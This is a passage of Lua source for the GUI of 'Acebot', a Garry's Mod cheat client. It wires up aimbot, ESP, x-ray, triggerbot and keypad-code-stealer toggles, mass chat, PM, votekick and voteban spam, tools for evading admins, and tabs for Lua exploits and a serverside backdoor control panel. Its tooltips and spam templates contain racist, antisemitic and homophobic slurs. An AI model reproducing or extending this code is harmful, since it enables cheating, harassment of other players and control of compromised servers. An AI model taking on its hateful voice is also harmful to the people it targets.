    surface.DrawRect(0, 0, General:GetWide(), General:GetTall())

    surface.SetDrawColor( 50, 50, 90, 255 )

    surface.DrawRect(0, 40, General:GetWide(), 2)

end



local Utility = vgui.Create( "DPanel" )

Utility:SetPos( 0, 0 )

Utility:SetSize( 480, AceMenu:GetTall() - 40 )



Utility.Paint = function() -- Paint function

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, Utility:GetWide(), Utility:GetTall())

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, Utility:GetWide(), Utility:GetTall())

end



local Botsettings = vgui.Create( "DPanel" )

Botsettings:SetPos( 0, 0 )

Botsettings:SetSize( 480, AceMenu:GetTall() - 40 )



Botsettings.Paint = function() -- Paint function

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, Botsettings:GetWide(), Botsettings:GetTall())

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, Botsettings:GetWide(), Botsettings:GetTall())

end



local Debug = vgui.Create( "DPanel" )

Debug:SetPos( 0, 0 )

Debug:SetSize( 480, AceMenu:GetTall() - 40 )



Debug.Paint = function() -- Paint function

    surface.SetDrawColor(50, 50, 50 ,255)

    surface.DrawOutlinedRect(0, 0, Debug:GetWide(), Debug:GetTall())

    surface.SetDrawColor(0, 0, 0 ,200)

    surface.DrawRect(0, 0, Debug:GetWide(), Debug:GetTall())

    if AB.MemoryDebug then

        draw.DrawText( "Visuals Memory Usage: "..AB.MemoryDebug["hud"].."kb", "Default", 10, 530, Color(255,255,255) )

        draw.DrawText( "Logic Core Memory Usage: "..AB.MemoryDebug["logic"].."kb", "Default", 10, 545, Color(255,255,255) )

        draw.DrawText( "Aimbot Core Memory Usage: "..AB.MemoryDebug["aimbot"].."kb", "Default", 10, 560, Color(255,255,255) )

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawRect(250, 532, math.Clamp( AB.MemoryDebug["hud"] * 0.75, 0, 200), 10 )

        surface.DrawRect(250, 547, math.Clamp( AB.MemoryDebug["logic"] * 20, 0, 200), 10 )

        surface.DrawRect(250, 562, math.Clamp( AB.MemoryDebug["aimbot"] * 20, 0, 200), 10 )

        surface.SetDrawColor(150, 150, 250 ,255)

        surface.DrawOutlinedRect(250, 532, 200, 10 )

        surface.DrawOutlinedRect(250, 547, 200, 10 )

        surface.DrawOutlinedRect(250, 562, 200, 10 )

    end

end





--------------------------------------------Buttons-------------------------------------------





function AB.RefreshConsole()

if richtext then richtext:Remove() end

if !ValidPanel(Debug) then return end

richtext = vgui.Create( "RichText", Debug )

richtext:SetPos(5, 5)

richtext:SetSize( 440, AceMenu:GetTall() - 180 )



for idx, tab in pairs(AB.Debug) do

    richtext:InsertColorChange( tab[2].r, tab[2].g, tab[2].b, 255 )

    richtext:AppendText( tab[1].."\n" )

end

end



timer.Create("ab_refreshconsole", 1, 0, function() AB.RefreshConsole() end)





AB.MakeToggleButton( General, 5, 10, "Vision", "Vision", "Vision Mode")



AB.MakeSlider( General, 5, 590, 455, "Max Vision Range (Metres)", 0, 2000, "VisionDist" )



AB.MakeToggleButton( General, 5, 70, "ESP Enabled", "ShowESP", "Show ESP")

AB.MakeToggleButton( General, 120, 70, "Show Dead Players", "ShowDead", "Show Dead Players")

AB.MakeToggleButton( General, 235, 70, "Show Friends", "ShowFriends", "Show Friends")

AB.MakeToggleButton( General, 350, 70, "Radar Colours", "RadarColors", "Coloured players on radar")

AB.MakeToggleButton( General, 350, 100, "Show Traitors", "ShowTraitors", "Show Traitors (TTT)", "Controls whether the ESP shows known traitors in the TTT gamemode")

AB.MakeToggleButton( General, 235, 100, "Highlight Targets", "ShowTargets", "Highlight Targets", "Highlights people that are on your targets list")

AB.MakeToggleButton( General, 120, 100, "Show Admins", "ShowRanks", "Show Admins")

AB.MakeToggleButton( General, 5, 100, "Show Distance", "ShowDistance", "Show Distance")

AB.MakeToggleButton( General, 5, 130, "Highlight Props", "ESPProps", "ESP Highlight Props")

AB.MakeToggleButton( General, 120, 130, "Show Marked Ents", "Entfinder", "ESP Show Marked Ents")

AB.MakeToggleButton( General, 235, 130, "Show Team Colours", "TeamColors", "Show Team Colours")

AB.MakeToggleButton( General, 350, 130, "Show Health", "ShowHP", "Show Health")

AB.MakeToggleButton( General, 5, 490, "Vision Lines", "Vizlines", "Shows which direction players are looking")

AB.MakeToggleButton( General, 120, 490, "Add Steam Friends", "AutoAddSteamFriends", "Automatically add steam friends to your ESP")

AB.MakeToggleButton( General, 5, 160, "Show Position", "VSquares", "Show player positions on the esp")

AB.MakeToggleButton( General, 120, 160, "Show Names", "VNames", "Show player names on the esp")



AB.MakeToggleButton( General, 5, 190, "Rear Vision Mirror", "Mirror", "Rear Vision Mirror")



AB.MakeSlider( General, 5, 225, 225, "Mirror X", 0, ScrW(), "MirrorX" )

AB.MakeSlider( General, 235, 225, 220, "Mirror Y", 0, ScrH(), "MirrorY" )

AB.MakeSlider( General, 235, 190, 220, "Mirror Size", 0, 60, "MirrorSize" )

AB.MakeFunctionButton( General, 120, 190, "Mirror Vertical Axis", function()

if AB.NumberVars.MirrorAxis == 0 then

if AB.Vars.Notifications then AB.ChatText( "Set mirror axis mode to mimic", Color(255,255,255) ) end

AB.NumberVars.MirrorAxis = 1

elseif AB.NumberVars.MirrorAxis == 1 then

if AB.Vars.Notifications then AB.ChatText( "Set mirror axis mode to reverse", Color(255,255,255) ) end

AB.NumberVars.MirrorAxis = 2

else

if AB.Vars.Notifications then AB.ChatText( "Set mirror axis mode to none", Color(255,255,255) ) end

AB.NumberVars.MirrorAxis = 0

end

end)



AB.MakeFunctionButton( General, 5, 260, "Toggle Freecam", function() 

    AB.Freecam = !AB.Freecam

    AB.ChatText( "Set freecam mode to: "..tostring(AB.Freecam), Color(255,255,255) )

end, "Hijacks the rear vision mirror and turns it into a ghetto freecam system")

AB.MakeFunctionButton( General, 120, 260, "Bring Freecam Here", function() 

    AB.FreecamCoordinates.pos = LocalPlayer():EyePos() 

    AB.FreecamCoordinates.ang = LocalPlayer():EyeAngles()

    AB.ChatText( "Brought freecam to my eye pos", Color(255,255,255) )

end, "Snaps the freecam to your view position")

AB.MakeToggleButton( General, 120, 290, "Freecam Is Movable", "FreecamControls", "Freecam controls active")





AB.MakeKeyBinder(General, 400, 260, 50, 20, "FreecamForward", "freecam move forward" )

AB.MakeKeyBinder(General, 400, 290, 50, 20, "FreecamBack", "freecam move backwards" )

AB.MakeKeyBinder(General, 235, 275, 50, 20, "FreecamLeft", "freecam turn left" )

AB.MakeKeyBinder(General, 345, 275, 50, 20, "FreecamRight", "freecam turn right" )

AB.MakeKeyBinder(General, 290, 260, 50, 20, "FreecamUp", "freecam pitch up" )

AB.MakeKeyBinder(General, 290, 290, 50, 20, "FreecamDown", "freecam pitch down" )



AB.MakeToggleButton( General, 5, 320, "Player Radar", "Radar", "Player Radar")

AB.MakeSlider( General, 120, 320, 165, "Radar Size", 50, 600, "RadarSize" )

AB.MakeSlider( General, 290, 320, 165, "Radar Zoom", 10, 150, "RadarZoom" )

AB.MakeSlider( General, 5, 350, 145, "Radar X", 0, ScrW(), "RadarX" )

AB.MakeSlider( General, 155, 350, 145, "Radar Y", 0, ScrH(), "RadarY" )

AB.MakeSlider( General, 305, 350, 150, "Rad Alpha", 0, 255, "RadarAlpha" )



AB.MakeToggleButton( General, 5, 390, "Xray Enabled", "Xray", "X-Ray")

AB.MakeToggleButton( General, 120, 390, "Xray Players", "XrayPlayers", "Show players on X-Ray")

AB.MakeToggleButton( General, 235, 390, "Xray Props", "XrayProps", "Show props on X-Ray")

AB.MakeToggleButton( General, 350, 390, "Xray Marked Ents", "XrayEntfinder", "Show marked entities on X-Ray")

AB.MakeToggleButton( General, 5, 420, "Xray Solid Chams", "XraySolid", "X-Ray Solid Chams")

AB.MakeSlider( General, 5, 450, 465, "Xray Maximum Distance (metres)", 0, 2000, "XrayDistance" )

AB.MakeToggleButton( General, 120, 420, "Xray Colours", "NoChamColours", "Xray Colours")

AB.MakeToggleButton( General, 235, 420, "Xray Bright Colours", "PKChams", "Xray Bright Chams")





AB.MakeToggleButton( Utility, 5, 480, "Witness Detector", "WitnessDetector", "Witness Detector")

AB.MakeToggleButton( Utility, 120, 480, "Spectator Detector", "SpectatorDetector", "Spectator Detector")

AB.MakeToggleButton( General, 120, 550, "Crosshair", "Crosshair", "Crosshair")

AB.MakeToggleButton( General, 235, 490, "Draw 3D BBox", "BoundingBox3d", "3D Bounding Boxes on Players")

AB.MakeFunctionButton( General, 235, 550, "Wraith Vision", function() AB.ToggleWraithVision() end)

AB.MakeToggleButton( General, 120, 520, "PK Player Beams", "PKPlayerBeams", "Propkill Playertrace Beams")

AB.MakeToggleButton( General, 235, 520, "PK Prop Beams", "PKPropBeams", "Propkill Proptrace Beams")

AB.MakeToggleButton( General, 350, 520, "PK Vertical Beams", "PKVerticalBeams", "Propkill Vertical Beams")

AB.MakeToggleButton( General, 5, 550, "PK Show Velocity", "PKVelocity", "Propkill Velocity Leaders")

AB.MakeToggleButton( General, 350, 550, "Clientside Flashlight", "CSFlashlight", "Clientside Flashlight")



AB.MakeFunctionButton( General, 350, 10, "Players Menu", function() AB.PlayerMenu() end)

AB.MakeFunctionButton( General, 120, 10, "Cycle Color Scheme", function()

    if AB.NumberVars.ColorScheme < #AB.DefaultSchemes then

        AB.NumberVars.ColorScheme = AB.NumberVars.ColorScheme + 1

    else

        AB.NumberVars.ColorScheme = 1

    end



    AB.ChangeColorScheme( AB.NumberVars.ColorScheme )

end)

AB.MakeFunctionButton( General, 235, 10, "Ent marker menu", AB.EntMarkerMenu )



AB.MakeToggleButton( Utility, 5, 10, "Autoclick", "Autoclick", "Auto Mouse Click", "Make your mouse buttons fire at the maximum possible speed when holding them down")

AB.MakeToggleButton( Utility, 120, 10, "Bhop", "Bhop", "Auto Bhop")

AB.MakeToggleButton( Utility, 235, 10, "Rope-Nado", "RopeStorm", "Rope-Nado", "Right click with rope tool out to spam a fuckton of ropes")

AB.MakeToggleButton( Utility, 350, 10, "Triggerbot", "Triggerbot", "Triggerbot", "Automatically pull the trigger when you look at somebody")

AB.MakeToggleButton( Utility, 5, 40, "Third Person", "Thirdperson", "Third Person Camera")

--AB.MakeToggleButton( Utility, 5, 120, "Camera Spam", "CameraSpam", "Camera Spam")

AB.MakeToggleButton( Utility, 120, 120, "No Recoil", "NoRecoil", "No Recoil", "Prevents weapons from changing your eye angles")

AB.MakeToggleButton( Utility, 235, 120, "Flashlight Spam", "FlashlightSpam", "Flashlight Spam", "Press F to party hard")

AB.MakeSlider( Utility, 120, 40, 160, "TPS Distance", 0, 1000, "TPSDistance" )

AB.MakeSlider( Utility, 285, 40, 175, "TPS Offset", -100, 100, "TPSOffset" )



AB.MakeToggleButton( Utility, 5, 90, "Name Changer Script", "NameStealer", "Name Change Script", "Enables or disabled the name change helper script, corrects malfunctions present in odiums name change command")

AB.MakeFunctionButton( Utility, 350, 90, "Disable NameStealer", AB.NameStealerShutoff )



AB.MakeFunctionButton( Utility, 5, 150, "Inspect your Gun", AB.GunMenu, "Show a massive TLDR page of information about the gun in your hands" )

AB.MakeFunctionButton( Utility, 120, 150, "Entity Scanner", AB.ToggleEntityScanner, "Get detailed information and easily perform actions on entities under your cursor (use C menu for best effect)" )



AB.MakeToggleButton( Utility, 350, 120, "Notify Kills", "NotifyKills", "Notify Kills in Chat", "Prints kills to your chat window")

--AB.Vars.NotifyKills



AB.MakeToggleButton( Utility, 5, 210, "Chat Spammer", "ChatSpam", "Chat Spammer", "Spam chat and piss everybody off")

AB.MakeToggleButton( Utility, 120, 210, "Auto OOC", "ChatSpamOOC", "Auto OOC chatspam", "Automatically make your chat spam in OOC mode in darkrp and most other rp gamemodes")

AB.MakeToggleButton( Utility, 235, 210, "Bind Mode", "ChatSpamBind", "Bind Mode (L ALT)", "You only chatspam when left alt is pressed")

--AB.MakeToggleButton( Utility, 350, 210, "Random Insults", "ChatSpamInsult", "Chatspam Random Insults", "Shower randomly generated abuse on everybody")

AB.MakeToggleButton( Utility, 350, 180, "/PM Mode", "ChatSpamPM", "/PM Spam Mode", "Spams /pm messages to everybody on the server")

AB.MakeToggleButton( Utility, 350, 210, "/PM Admins", "ChatSpamPMAdmins", "/PM Spam Target Admins", "Should we /pm spam admins?")



AB.MakeFunctionButton( Utility, 235, 180, "Chatspam Help", function() 

    AB.ChatText( "Printed chatspam formatting info to console", Color(255,255,255) )

    print( "---- CHAT SPAMMER PATTERN MATCHES ----" )

    print( "@1 = Random insult" )

    print( "@2 = Angry insult" )

    print( "@3 = Admin insult" )

    print( "@4 = CSGO skid gibberish" )

    print( "@opener = Insult opening line" )

    print( "@joiner = Insult joining line" )

    print( "@slur = Random racist/sexist/fucking hilarious slur" )

    print( "PUT THESE IN THE CHATSPAMMER TEXT FIELD AND THEY WILL BE AUTOMATICALLY FORMATTED INTO RANDOMLY GENERATED TEXT")

end, "HALP HOW I USE DIS" )



AB.MakeFunctionButton( Utility, 5, 300, "Dodge RP Admins", AB.InnocentRoleplayer, "You got seen doing something shifty, now its time to get a new identity\nSuicides and randomizes your rpname, job and player colours\nBind a key to ace_innocent_roleplayer to trigger quickly" )

AB.MakeFunctionButton( Utility, 120, 300, "Random RPname", AB.GenerateRPName, "Like you can be arsed thinking up a good rpname, this one will generate a random one for you" )

AB.MakeFunctionButton( Utility, 235, 300, "RandomRPname (fem)", AB.GenerateRPNameFemale, "You want to become a girl so you can take cocks up your ass and still call yourself straight" )

AB.MakeToggleButton( Utility, 5, 330, "RP Demote Spam", "DemoteSpam", "Spam /Demote requests", "Demote everybody on the server from their shitty jobs")

AB.MakeToggleButton( Utility, 120, 330, "RP Wanted Spam", "WantedSpam", "Spam /Wanted requests", "Make everybody wanted by the police")

AB.MakeToggleButton( Utility, 235, 330, "ULX Vkick Spam", "ULXVotekickSpam", "Spam ulx votekicks", "Votekick everybody on the server :^)")

AB.MakeToggleButton( Utility, 350, 330, "ULX Vban Spam", "ULXVotebanSpam", "Spam ulx votebans", "Voteban everybody on the server :^)")

AB.MakeToggleButton( Utility, 5, 360, "Bhop Auto Strafe", "BhopAutostrafe", "Bhop Auto Strafe", "Presses A and D for you when you move your mouse, you lazy fuck")

AB.MakeToggleButton( Utility, 120, 360, "Kill Taunts", "KillTaunts", "Kill Taunts", "Let acebot automatically talk smack for you whenever you kill somebody")

AB.MakeToggleButton( Utility, 235, 360, "Death Taunts", "DeathTaunts", "Death Taunts", "Automatic chat rage when you die")



AB.MakeFunctionButton( Utility, 5, 450, "Set Base", function() RunConsoleCommand("ace_base_set") end, "Set a home base location to warn you if people go near it" )

AB.MakeFunctionButton( Utility, 120, 450, "Remove Base", function() RunConsoleCommand("ace_base_remove") end, "Delete your base" )

AB.MakeToggleButton( Utility, 350, 420, "Keypad Jew", "KeypadJew", "Keypad Code Stealer", "Your a sneaky jew stealing peoples keypad codes and busting into their base")



AB.MakeToggleButton( Utility, 5, 420, "RP Arrest Dodger", "DodgeArrest", "Get out of jail free card", "Automatically suicide if somebody tries to hit you with an arrest baton")

AB.MakeToggleButton( Utility, 120, 420, "New RPname on Death", "NewLifeRule", "Choose new RPname when killed", "Make things extra confusing for cuntmins")

--AB.MakeToggleButton( Utility, 235, 420, "Dodge Physgun", "DontTouchMeThere", "Suicide When PhysGunned", "Don't touch me there, that's my private place")





AB.MakeToggleButton( Botsettings, 5, 10, "Toggle Aimbot", "Aimbot", "Aimbot", "Sup pussy ass white boi how bout i come to ur base and fuck ur girl u little bitch, imma shoot lazers all up in this place pew pew nigga")

AB.MakeToggleButton( Botsettings, 120, 10, "Snap on Shoot Only", "SnapOnFire", "Aimbot only snaps when firing", "Makes things a little bit more sneeki breeki")

AB.MakeToggleButton( Botsettings, 5, 40, "Auto Shoot", "AutoShoot", "Aimbot Auto-Shoot", "Your aimbot is now doing all the work for you, you may as well afk and masturbate")

AB.MakeToggleButton( Botsettings, 235, 70, "Auto Trigger", "AutoTrigger", "Aimbot Auto-Trigger", "Spams the trigger on semi auto weapons when locked on and holding left click")

AB.MakeToggleButton( Botsettings, 120, 40, "Snap on Bind Only", "AimbotBindMode", "Aimbot snap only when bind pressed", "Extra protection against accidentally fucking yourself over when trying to play >legit")

--AB.MakeToggleButton( Botsettings, 235, 40, "Shoot Through Walls", "AimbotShootThroughWalls", "Aimbot shoot through walls", "Target people through walls?")

AB.MakeToggleButton( Botsettings, 235, 40, "M9K Wallbanger", "AimbotWallbanger", "Aimbot shoot through walls (m9k)", "Lock on to people if the current gun is able to penetrate the wall/object they are hiding behind")

AB.MakeToggleButton( Botsettings, 235, 10, "Draw Target Position", "PreviewTarget", "Draw Target Lock Position", "Shows the current/next position the aimbot is locking on to")

AB.MakeToggleButton( Botsettings, 350, 10, "Compensate Spread", "CompSpread", "Compensate Bullet Spread", "Basically cac undetected nospread. Works with m9k, hl2 weps, ttt weps and some simple weapon bases.  Does not work with fas2 or cw2")

AB.MakeToggleButton( Botsettings, 350, 40, "Silent Aim", "SilentAim", "Silent Aim", "Makes it far less obvious that you are aimbotting")

AB.MakeToggleButton( Botsettings, 350, 70, "Adaptive Targeting", "AimbotAdaptiveTarget", "Aimbot Adaptive Targeting", "Shoot at any part of their body that is exposed, not just their head.  Absolute rape when paired with comp spread and wallbanger")



AB.MakeToggleButton( Botsettings, 5, 160, "Target Friends", "TargetFriends", "Aimbot Target Friends", "Do you really want to betray your buddies like this? :(")

AB.MakeToggleButton( Botsettings, 120, 160, "Target Admins", "TargetAdmins", "Aimbot Target Admins", "Milk some darkrp admin tears")

AB.MakeToggleButton( Botsettings, 235, 160, "Target Same Team", "TargetSameTeam", "Aimbot Target Same Team", "Do you want to betray your team?")

AB.MakeToggleButton( Botsettings, 350, 160, "Target Highlighted", "TargetHighlighted", "Aimbot Target Highlighted targets", "For killing those special high priority targets")

AB.MakeToggleButton( Botsettings, 120, 190, "Target Noclippers", "TargetNoclippers", "Aimbot Target People in Noclip", "You usually can't kill them anyway so why bother?")

AB.MakeToggleButton( Botsettings, 5, 190, "Prefer Headshots", "AimbotTargetMode", "Aimbot Target Heads", "Target heads or go straight for centre of mass?")

AB.MakeToggleButton( Botsettings, 235, 190, "Sticky Targeting", "AimbotStickyLock", "Sticky Targeting", "Aimbot will not switch target until the current target is dead, out of FOV or no longer visible")

--AB.MakeToggleButton( Botsettings, 5, 190, "Prefer Headshots", "AimbotTargetMode", "Aimbot Target Heads", "Target heads or go straight for centre of mass?")





local tttt = vgui.Create( "DLabel", Botsettings )

tttt:SetPos( 25, 228 )

tttt:SetText( "Aimbot Bind Key:" )

tttt:SizeToContents()



AB.MakeKeyBinder( Botsettings, 120, 220, 110, 30, "AimbotBindKey", "aimbot" )



AB.MakeSlider( Botsettings, 5, 70, 210, "Smooth Aim", 0, 50, "AimbotSmooth" )

AB.MakeSlider( Botsettings, 5, 100, 210, "Max Distance", 0, 9999, "AimbotDist" )

AB.MakeSlider( Botsettings, 225, 100, 220, "Targeting FOV", 0.1, 180, "AimbotMaxFOV" )





local TextEntry = vgui.Create( "DTextEntry", Utility )

TextEntry:SetPos( 120, 90 )

TextEntry:SetSize( 195, 25 )

TextEntry:SetText( AB.NameStealName )

TextEntry.OnEnter = function( self )

AB.NameStealName = self:GetValue()

if AB.Vars.Notifications then AB.ChatText( "Set my name to: "..self:GetValue(), Color(255,255,255) ) end

end



local TextEntry = vgui.Create( "DTextEntry", Utility )

TextEntry:SetPos( 5, 240 )

TextEntry:SetSize( 450, 25 )

TextEntry:SetText( AB.ChatSpamText )

TextEntry.OnEnter = function( self )

AB.ChatSpamText = self:GetValue()

if AB.Vars.Notifications then AB.ChatText( "Set my chatspam message to: "..self:GetValue(), Color(255,255,255) ) end

end





AB.MakeFunctionButton( Debug, 5, AceMenu:GetTall() - 110, "Clear Console", function() table.Empty(AB.Debug) end)

AB.MakeFunctionButton( Debug, 120, AceMenu:GetTall() - 110, "Print Changelog", function() 

    AB.DebugLog( "", Color(0,0,0) )

    AB.DebugLog( "Acebot current version: "..AB.Version, Color(155,255,155) )

    AB.DebugLog( "", Color(0,0,0) )

    local tt = 200

    for k, v in SortedPairs(AB.Changelog, false) do AB.DebugLog( v, Color(tt, tt, tt + 30) ) tt = math.Clamp(tt - 10, 100, 200) end 

end)

--AB.MakeFunctionButton( Debug, 235, Menu:GetTall() - 110, "Game Event Logging", function() end)

--AB.MakeFunctionButton( Debug, 350, Menu:GetTall() - 110, "Extensive Logging", function() end)



PropertySheet:AddSheet( "Vision", General, "icon16/zoom.png", false, false, "ESP/Xray/HUD settings" )

--PropertySheet:AddSheet( "Vision Advanced", General2, "icon16/zoom_in.png", false, false, "ESP/Xray/HUD settings" )

PropertySheet:AddSheet( "Utility", Utility, "icon16/wrench.png", false, false, "Tools and utilities" )

PropertySheet:AddSheet( "Aimbot", Botsettings, "icon16/bomb.png", false, false, "Aimbot settings" )

PropertySheet:AddSheet( "Exploit", Exploit, "icon16/bug.png", false, false, "Lua Exploit settings" )

PropertySheet:AddSheet( "Backdoor", Backdoor, "icon16/door_in.png", false, false, "Control panel for the Wraithnet/HTX serverside backdoor" )

PropertySheet:AddSheet( "Debug", Debug, "icon16/printer.png", false, false, "Acebot debug settings" )



end

concommand.Add("ace_menu", AB.Menu)





------------------------------------------------------------------------DEBUG CONSOLE SHIT--------------------------------------------------------------------------------------







function AB.DebugLog( str, col )

table.insert(AB.Debug, {str, col})

if #AB.Debug > 40 then

    table.remove( AB.Debug, 1 )

end

end



------------------------------------------------------------------------ENT MARKER MENU--------------------------------------------------------------------------------------















local OtherEnts = {}



function AB.EntMarkerMenu()

if EMenu then return end



table.Empty(OtherEnts)

for k,v in pairs(ents.GetAll()) do

    local addToAllEnts = true

            

    for i,p in pairs(AB.MarkedEnts) do

        if p == v:GetClass() then

            addToAllEnts = false

        end

    end

            

    for i,p in pairs(OtherEnts) do

        if p == v:GetClass() then

            addToAllEnts = false

        end

    end

            

    if addToAllEnts then

        table.insert(OtherEnts, v:GetClass())

    end

end



local EMenu = vgui.Create("DFrame")

EMenu:SetSize(500,485)

EMenu:SetTitle("Entity marker menu")

EMenu:Center()

EMenu:MakePopup()



EMenu.Paint = function()

surface.SetDrawColor( Color(50, 50, 90, 255) )

surface.DrawRect( 0, 0, EMenu:GetWide(), EMenu:GetTall() )

surface.SetDrawColor( Color(155, 155, 155, 255) )

surface.DrawOutlinedRect( 0, 0, EMenu:GetWide(), EMenu:GetTall() )

surface.DrawOutlinedRect( 1, 1, EMenu:GetWide() - 2, EMenu:GetTall() - 2 )

surface.SetDrawColor( Color(0, 0, 0, 200) )

surface.DrawRect( 10, 25, EMenu:GetWide() - 20, EMenu:GetTall() - 35 )

end





DermaList = vgui.Create( "DPanelList", EMenu )

        DermaList:SetPos( 25,35 )

        DermaList:SetSize( 500, 400 )

        DermaList:SetSpacing( 75 )

        DermaList:EnableHorizontal( false )

        DermaList:EnableVerticalScrollbar( true )

        

        local SelectedEnts = vgui.Create("DListView")

        SelectedEnts:SetSize(220, 335)

        SelectedEnts:SetPos(0, 0)

        SelectedEnts:SetMultiSelect(false)

        SelectedEnts:AddColumn("Ents to show")

        for k,v in SortedPairs(AB.MarkedEnts, false) do

            SelectedEnts:AddLine(v)

        end

        SelectedEnts.DoDoubleClick = function(parent, index, list)

            table.remove(AB.MarkedEnts, index)

            EMenu:rebuildlists()

        end

        DermaList:Add(SelectedEnts)

        

        local AllEnts = vgui.Create("DListView")

        AllEnts:SetSize(220, 335)

        AllEnts:SetPos(230, 0)

        AllEnts:SetMultiSelect(false)

        AllEnts:AddColumn("Ents not to show")

        for k,v in SortedPairs(OtherEnts, false) do

            AllEnts:AddLine(v)

        end

        AllEnts.DoDoubleClick = function(parent, index, panel )

            table.insert(AB.MarkedEnts, OtherEnts[index])

            EMenu:rebuildlists()

        end

DermaList:Add(AllEnts)





function EMenu:rebuildlists()

    table.Empty(OtherEnts)

    for k,v in pairs(ents.GetAll()) do

        local addToAllEnts = true

            

        for i,p in pairs(AB.MarkedEnts) do

            if p == v:GetClass() then

                addToAllEnts = false

            end

        end

            

        for i,p in pairs(OtherEnts) do

            if p == v:GetClass() then

                addToAllEnts = false

            end

        end

            

        if addToAllEnts then

            table.insert(OtherEnts, v:GetClass())

        end

    end



    AllEnts:Clear()

    SelectedEnts:Clear()

    for k,v in SortedPairs(OtherEnts, false) do

        AllEnts:AddLine( v )

    end

    for k,v in SortedPairs(AB.MarkedEnts, false) do

        SelectedEnts:AddLine( v )

    end

end





AB.MakeFunctionButton( EMenu, 25, 380, "Find all Printers", function() 

    for k,v in pairs(ents.GetAll()) do 

        if string.find(v:GetClass(), "print") and !table.HasValue(AB.MarkedEnts, v:GetClass()) then 

            table.insert(AB.MarkedEnts, v:GetClass()) 

        end 

    end 

EMenu:rebuildlists()

end, "Finds everything that looks like a money printer")



AB.MakeFunctionButton( EMenu, 140, 380, "Find all Weapons", function() 

    for k,v in pairs(ents.GetAll()) do 

        if (string.find(v:GetClass(), "weap") or string.find(v:GetClass(), "fas2") or string.find(v:GetClass(), "m9k")) and !table.HasValue(AB.MarkedEnts, v:GetClass()) then 

            table.insert(AB.MarkedEnts, v:GetClass()) 

        end 

    end 

EMenu:rebuildlists()

end, "Finds everything that looks like a weapon")



AB.MakeFunctionButton( EMenu, 255, 380, "Find all Vehicles", function() 

    for k,v in pairs(ents.GetAll()) do 

        if v:IsVehicle() and !table.HasValue(AB.MarkedEnts, v:GetClass()) then 

            table.insert(AB.MarkedEnts, v:GetClass()) 

        end 

    end 

EMenu:rebuildlists()

end, "Finds everything that looks like a vehicle")



AB.MakeFunctionButton( EMenu, 370, 380, "Find all Loot", function() 

    for k,v in pairs(ents.GetAll()) do 

        if (string.find(v:GetClass(), "item") or string.find(v:GetClass(), "loot")) and !table.HasValue(AB.MarkedEnts, v:GetClass()) then 

            table.insert(AB.MarkedEnts, v:GetClass()) 

        end 

    end 

EMenu:rebuildlists()

end, "Finds everything that looks like loot items (generally only useful for gmod dayz, after the end etc)")



AB.MakeFunctionButton( EMenu, 25, 410, "Find all RP Goodies", function() 

    for k,v in pairs(ents.GetAll()) do 

        if v:GetClass() == "spawned_shipment" or v:GetClass() == "spawned_money" or v:GetClass() == "spawned_weapon" or v:GetClass() == "spawned_ammo" or v:GetClass() == "spawned_food" and !table.HasValue(AB.MarkedEnts, v:GetClass()) then 

            table.insert(AB.MarkedEnts, v:GetClass() ) 

        end 

    end 

EMenu:rebuildlists()

end, "Finds all darkrp goodies (guns, money, shipments etc)")



AB.MakeFunctionButton( EMenu, 370, 410, "Clear List", function() 

AB.MarkedEnts = {}

EMenu:rebuildlists()

end, "Clears the entfinder list")



local turd = vgui.Create( "DLabel", EMenu )

turd:SetPos( 25, 447 )

turd:SetText( "Search for classes: " )

turd:SizeToContents()



local target4 = vgui.Create( "DTextEntry", EMenu )

target4:SetPos( 125, 442 )

target4:SetSize( 255, 25 )

target4:SetText( "" )

target4.OnChange = function( self )

    local nam = self:GetValue()

    if nam == "" then 

        AB.MarkedEnts = {}

        EMenu:rebuildlists()

        return

    end

    local namtab = string.Explode( ", ", nam )

    AB.MarkedEnts = {}

    for _, en in pairs( ents.GetAll() ) do

        for _, s in pairs( namtab ) do

            if string.find( string.lower( en:GetClass() ), s, 1, true ) then

                if !table.HasValue( AB.MarkedEnts, en:GetClass() ) then table.insert( AB.MarkedEnts, en:GetClass() ) end

            end

        end

    end

    EMenu:rebuildlists()

end



end

concommand.Add("ace_ents", AB.EntMarkerMenu)







------------------------------------------------------------------------PLAYERS MENU--------------------------------------------------------------------------------------





function AB.PlayerMenu()

if PMenu then return end



local PMenu = vgui.Create("DFrame")

PMenu:SetSize(590,420)

PMenu:SetTitle("Players menu")

PMenu:Center()

PMenu:MakePopup()



PMenu.Paint = function()

surface.SetDrawColor( Color(50, 50, 90, 255) )

surface.DrawRect( 0, 0, PMenu:GetWide(), PMenu:GetTall() )

surface.SetDrawColor( Color(155, 155, 155, 255) )

surface.DrawOutlinedRect( 0, 0, PMenu:GetWide(), PMenu:GetTall() )

surface.DrawOutlinedRect( 1, 1, PMenu:GetWide() - 2, PMenu:GetTall() - 2 )

surface.SetDrawColor( Color(0, 0, 0, 200) )

surface.DrawRect( 10, 25, PMenu:GetWide() - 20, PMenu:GetTall() - 35 )

end





local Plist = vgui.Create( "DPanelList", PMenu )

Plist:SetSize( 560, 370 )

Plist:SetPadding( 5 )

Plist:SetSpacing( 5 )

Plist:EnableHorizontal( false )

Plist:EnableVerticalScrollbar( true )

Plist:SetPos( 10, 25 )

Plist:SetName( "" )



for k, v in pairs( player.GetAll() ) do

if v == LocalPlayer() then continue end



    local plypanel2 = vgui.Create( "DPanel" )

    plypanel2:SetPos( 0, 0 )

    plypanel2:SetSize( 480, 40 )

    plypanel2.Paint = function() -- Paint function

        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)

        surface.SetDrawColor(Color(50, 50, 90, 255))

        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)

    end



    local plyname = vgui.Create( "DLabel", plypanel2 )

    plyname:SetPos( 15, 5 )

    plyname:SetFont( "Trebuchet18" )

    plyname:SetColor( team.GetColor(v:Team()) )

    plyname:SetText( "Name: "..v:Nick() )

    plyname:SetSize(180, 15)



    if AB.GetRank(v) != ( "user" or "guest" or "player" ) then

    local rtxt = vgui.Create( "DLabel", plypanel2 )

    rtxt:SetPos( 15, 20 )

    rtxt:SetFont( "Trebuchet18" )

    rtxt:SetColor( Color(255,100,0,255) )

    rtxt:SetText( "Rank: "..AB.GetRank(v) )

